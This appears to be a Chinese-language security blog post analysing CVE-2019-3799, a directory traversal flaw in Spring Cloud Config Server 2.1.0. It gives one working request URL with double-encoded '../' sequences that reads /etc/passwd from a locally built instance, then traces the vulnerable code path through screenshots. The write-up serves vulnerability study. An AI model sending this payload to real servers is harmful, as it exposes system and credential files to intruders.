---
layout:     post
title:      "CVE-2019-3799 —— Spring-Cloud-Config-Server Directory Traversal"
subtitle:   ""
date:       2019-04-26 13:14:00
author:     "kuron3k0"
header-img: "img/post-bg-rwd.jpg"
tags:
    - Spring
    - Directory Traversal
---

### 0x00 Spring Cloud Config 简介
    
Spring Cloud Config为分布式系统中的外部配置提供服务器和客户端支持。使用Config Server，您可以在所有环境中管理应用程序的外部属性。客户端和服务器上的概念映射与Spring Environment和PropertySource抽象相同，因此它们与Spring应用程序非常契合，但可以与任何以任何语言运行的应用程序一起使用。随着应用程序通过从开发人员到测试和生产的部署流程，您可以管理这些环境之间的配置，并确定应用程序具有迁移时需要运行的一切。服务器存储后端的默认实现使用git，因此它轻松支持标签版本的配置环境，以及可以访问用于管理内容的各种工具。可以轻松添加替代实现，并使用Spring配置将其插入。

### 0x01 漏洞利用

从[Github](https://github.com/spring-cloud/spring-cloud-config/releases)下载存在漏洞的版本在本地搭建，这里下了`2.1.0`的
![](/img/in-post/CVE-2019-3799/github.png)

直接访问`http://127.0.0.1:8888/test/pathtraversal/master/..%252f..%252f..%252f..%252f..%252f..%252f../etc/passwd`,获得 `/etc/passwd`内容
![](/img/in-post/CVE-2019-3799/passwd.png)

### 0x02 漏洞分析
访问Url后首先进入了`ResourceController`
![](/img/in-post/CVE-2019-3799/resourcecontroller.png)

接着调用`getFilePath`函数，获取Url中`../../../../../../etc/passwd`这一段
![](/img/in-post/CVE-2019-3799/getpath.png)

然后进入了`retrive`函数，接着跟进`findOne`函数
![](/img/in-post/CVE-2019-3799/findone.png)

`findOne`调用`ResourceLoader`的createRelative方法把`path`进行了拼接，并返回了对应的`Rescource`对象
![](/img/in-post/CVE-2019-3799/createrelative.png)

最后把文件内容赋给`text`，返回给浏览器
![](/img/in-post/CVE-2019-3799/rsp.png)

### 0x03 参考
[https://www.freebuf.com/vuls/201400.html](https://www.freebuf.com/vuls/201400.html)